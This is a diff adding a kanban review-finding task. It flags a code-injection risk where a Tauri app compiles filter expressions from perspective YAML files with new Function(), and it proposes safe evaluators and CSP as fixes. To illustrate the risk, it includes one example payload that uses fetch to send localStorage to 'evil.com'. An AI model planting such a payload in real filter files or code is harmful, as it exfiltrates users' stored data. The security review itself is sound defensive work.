@@ -1,0 +1,8 @@
+---
+assignees:
+- claude-code
+position_column: done
+position_ordinal: ffffffffffffffffffffb280
+title: 'BLOCKER: perspective-eval uses new Function() for filter expressions — code injection risk'
+---
+**File**: kanban-app/ui/src/lib/perspective-eval.ts (compileFilter function)\n\n**What**: Filter expressions are compiled via `new Function('fields', 'with(fields) { return (' + expression + '); }')`. The expression string comes from perspective definitions which are YAML files on disk. While this is not user-input from the network, the `with()` statement combined with `new Function()` creates code execution from data. If a perspective file is compromised or contains a malicious expression, arbitrary JS executes in the Tauri webview.\n\n**Why**: The Tauri webview has access to Tauri IPC commands including file system operations. A malicious filter expression like `(fetch('evil.com/steal?'+JSON.stringify(localStorage)),true)` would exfiltrate data.\n\n**Suggestion**: Consider a safe expression evaluator (e.g. `filtrex`, or a simple parser for field comparisons) instead of `new Function()`. If `new Function()` is retained, document the threat model explicitly and ensure perspective files are only loaded from trusted sources (the VFS stack already limits this, but the risk should be acknowledged). At minimum, wrap the execution in a try/catch and add CSP headers to limit fetch/XHR from the webview.\n\n**Subtasks**:\n- [ ] Evaluate alternative safe expression evaluators (filtrex, jsep+custom evaluator)\n- [ ] If keeping new Function(), add explicit threat model comment and CSP restrictions\n- [ ] Verify with test that malicious expressions are sandboxed or rejected #review-finding
